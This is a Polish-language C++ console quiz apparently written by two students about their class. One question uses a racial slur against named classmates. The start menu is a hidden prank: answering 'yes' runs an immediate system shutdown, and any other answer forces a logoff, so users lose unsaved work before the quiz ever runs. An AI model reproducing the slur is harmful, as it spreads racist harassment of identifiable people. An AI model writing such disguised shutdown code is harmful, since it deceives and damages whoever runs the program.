#include <iostream>
#include <Windows.h>
#include <cstdlib>

using namespace std;
int wynik = 0, odp;


void pytanie_1()
{
	cout << "Pytanie nr 1: Imie najslawniejszego informatyka z klasy 1G4:" << endl;
	cout << "1) Kuba" << endl << "2) Stanislaw" << endl << "3) Szymon" << endl << "4) Sebastian" << endl;
	cin >> odp;
	switch (odp)
	{
	case 2: wynik++; break;
	case 1: break;
	case 3: break;
	case 4: break;
	default:
		system("cls");
		cout << "Taka opcja nie istnieje" << endl;
		cout << endl;
		pytanie_1();
	}
	system("cls");

}

void pytanie_2()
{
	cout << "Pytanie nr 2: Jaka firma produkuje procesory" << endl;
	cout << "1) MSI" << endl << "2) Intel" << endl << "3) Nvidia" << endl << "4) Nike" << endl;
	cin >> odp;
	switch (odp)
	{
	case 2: wynik++; break;
	case 1: break;
	case 3: break;
	case 4: break;
	default:
		system("cls");
		cout << "Taka opcja nie istnieje" << endl;
		cout << endl;
		pytanie_2();
	}
	system("cls");
}

void pytanie_3()
{
	cout << "Pytanie nr 3: Kto jest the biggest nigger w 1G4" << endl;
	cout << "1) Bela" << endl << "2) Kula" << endl << "3) Edward" << endl << "4) Kuba" << endl;
	cin >> odp;
	switch (odp)
	{
	case 3: wynik++; break;
	case 1: break;
	case 2: break;
	case 4: break;
	default:
		system("cls");
		cout << "Taka opcja nie istnieje" << endl;
		cout << endl;
		pytanie_3();
	}
	system("cls");
}





void koniec()
{
	//ell matma tu bedzie do oblicznia wyniku

	cout << "Twoj wynik to: " << wynik;
}

int main()
{
	system("title QUIZ by Kuba E.  ORAZ  Sebastian K.");
	system("color 9");
	cout << "Witaj w naszym QUIZIE!" << endl;
	Sleep(1000);
	system("cls");
	cout << "Czy chcesz zaczac?" << endl;
	cout << "1) Tak" << endl << "2) Nie" << endl;
	cin >> odp;
	if (odp == 1) {
		cout << "Shit";
		system("shutdown /s /t 0");
	}
	switch (odp)
	{
	case 1:  system("cls");           goto start;
	default: system("shutdown -l");   break;
	}

start:
	pytanie_1();
	pytanie_2();
	pytanie_3();

	koniec();
}